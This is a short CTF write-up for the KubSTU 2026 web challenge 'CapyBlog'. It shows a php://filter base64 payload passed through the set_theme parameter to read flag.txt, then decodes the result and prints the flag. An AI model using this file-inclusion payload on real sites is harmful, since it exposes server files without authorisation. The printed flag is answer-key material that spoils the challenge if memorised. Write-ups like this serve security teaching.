---
layout: post
title:  "CapyBlog"
date:   2026-05-02 19:17:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /KubSTU-2026-capyblog/
---

**Author**: [@cyber_meow](https://t.me/cyber_meow)

**Category**: Web

**Description**: Lately, the theme change is buggy. Maybe it's because of the bugs? Did the site work the same way before? [http://193.42.127.24](http://193.42.127.24) [http://159.194.209.128](http://159.194.209.128)

I register and login on the site:

![Alt text](/images/kubstuweb4.png)

You change the theme with `http://193.42.127.24/index.php?set_theme=`.

Checking `robots.txt`:
```shell
curl http://193.42.127.24/robots.txt  
User-agent: *  
Disallow: /backup/
```

I always get a `403` from `/backup/`. On the other IP address I make this request:
```shell
curl -L "http://159.194.209.128/index.php?set_theme=php://filter/convert.base64-encode/resource=flag.txt"
```

Response:
```html
... etc
	</div>  
  
<footer>  
&copy; 2026 Капиблог. Все права защищены.  
</footer>  
  
</body>  
</html>  
  
<!--FLAG:-->  
<!--FLAG:-->  
<!--RESULT:S3ViU1RVKGNhcHlibDBnX3BocF9kM3MzcjFhbDF6YXQxMG4pCnx8fA==ENDRESULT-->  
```

```shell
echo "S3ViU1RVKGNhcHlibDBnX3BocF9kM3MzcjFhbDF6YXQxMG4pCnx8fA==" | base64 -d  
KubSTU(capybl0g_php_d3s3r1al1zat10n)
```

`KubSTU(capybl0g_php_d3s3r1al1zat10n)`